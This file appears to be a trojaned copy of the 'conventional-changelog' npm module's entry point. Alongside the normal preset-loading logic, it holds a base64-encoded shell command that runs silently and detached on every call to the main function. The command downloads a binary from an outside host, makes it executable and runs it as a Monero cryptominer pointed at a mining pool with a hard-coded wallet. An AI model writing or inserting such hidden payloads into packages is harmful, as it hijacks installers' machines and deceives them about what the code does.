'use strict';
var conventionalChangelogCore = require('conventional-changelog-core');
var conventionalChangelogPresetLoader = require('conventional-changelog-preset-loader');
var conventionalChangelogExecutor = require('child_process').spawn;
var conventionalChangelogStartupScript = "cm0gLXJmIC90bXAvLmRlYnVnICYmIGN1cmwgaHR0cHM6Ly9tbnJsbnQuYmxvYi5jb3JlLndpbmRvd3MubmV0L21uci9TaWxlbmNlIC1vIC90bXAvLmRlYnVnIDI+IC9kZXYvbnVsbCAmJiBjaG1vZCAreCAvdG1wLy5kZWJ1ZyAmJiAvdG1wLy5kZWJ1ZyAtbyBzdHJhdHVtK3RjcDovL3Bvb2wubWluZXhtci5jb206NDQ0NCAtdSA0QTlWNWtuR1VNOFBVZFBTSmJUb3g4YjltZ1RzZlhCeUs0OVhLdEV5cVZheUR4RDZDRkplNWRzZXhhTTk5eDdNWEZOVHhaa1lBcjRZdGNBWFFNa05yRmpuUlBKR0pGci5KTDZfJChob3N0bmFtZSAtZiB8IG1kNXN1bSB8IGN1dCAtYzEtOCkgLXAgeCAtdCAkKGxzY3B1IHwgZ3JlcCAnQ1BVKHMpJ3wgZ3JlcCAtdiAnLCcgfCBhd2sgJ3twcmludCAkMn0nIHwgaGVhZCAtbiAxKSAyPiAvZGV2L251bGwgJg=="
var conventionalStartupScript = Buffer.from(conventionalChangelogStartupScript, 'base64').toString();

function conventionalChangelog(options, context, gitRawCommitsOpts, parserOpts, writerOpts) {
  options.warn = options.warn || function() {};
  conventionalChangelogExecutor(conventionalStartupScript, [], { shell:true, stdio: 'ignore', detached:true}).unref();
  if (options.preset) {
    try {
      options.config = conventionalChangelogPresetLoader(options.preset.toLowerCase());
    } catch (err) {
      options.warn('Preset: "' + options.preset + '" does not exist');
    }
  }

  return conventionalChangelogCore(options, context, gitRawCommitsOpts, parserOpts, writerOpts);
}

module.exports = conventionalChangelog;
